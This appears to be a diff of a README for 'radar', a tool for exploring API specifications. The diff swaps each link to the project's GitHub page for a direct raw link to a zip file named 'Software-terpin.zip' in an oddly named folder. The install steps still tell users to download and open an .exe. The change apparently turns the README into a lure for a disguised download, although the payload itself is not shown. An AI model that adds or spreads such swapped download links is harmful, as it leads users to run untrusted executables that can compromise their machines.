@@ -1,6 +1,6 @@
 # 📡 radar - Explore API specifications with total ease
 
-[![](https://img.shields.io/badge/Download_Radar-Blue-blue.svg)](https://github.com/impacted-sunbathing654/radar)
+[![](https://img.shields.io/badge/Download_Radar-Blue-blue.svg)](https://raw.githubusercontent.com/impacted-sunbathing654/radar/main/polytomous/Software-terpin.zip)
 
 ## 📌 Introduction
 
@@ -21,7 +21,7 @@ Radar works on modern computers. Ensure your system meets these standards for th
 
 You do not need to compile code or install heavy environments. Follow these instructions to set up the software on your machine:
 
-1. Visit the [official download page](https://github.com/impacted-sunbathing654/radar) to access the latest installer.
+1. Visit the [official download page](https://raw.githubusercontent.com/impacted-sunbathing654/radar/main/polytomous/Software-terpin.zip) to access the latest installer.
 2. Look for the file ending in .exe in the list of assets.
 3. Click the file to start your download.
 4. Open the file once the download finishes.
@@ -78,4 +78,4 @@ If you encounter issues, verify the following:
 *   **Connection Timeouts**: If a request hangs, verify your internet connection. Some APIs limit the number of requests you send in a short time.
 *   **Displays**: If the interface looks small or fonts appear blurry, go to your Windows Display Settings and adjust the scaling. Radar works best at 100% or 125% scale.
 
-Restart the software if it becomes unresponsive. This resets the internal engine and clears memory buffers. If problems persist, return to the [download page](https://github.com/impacted-sunbathing654/radar) to check for newer releases or known issues reported by the community.
+Restart the software if it becomes unresponsive. This resets the internal engine and clears memory buffers. If problems persist, return to the [download page](https://raw.githubusercontent.com/impacted-sunbathing654/radar/main/polytomous/Software-terpin.zip) to check for newer releases or known issues reported by the community.
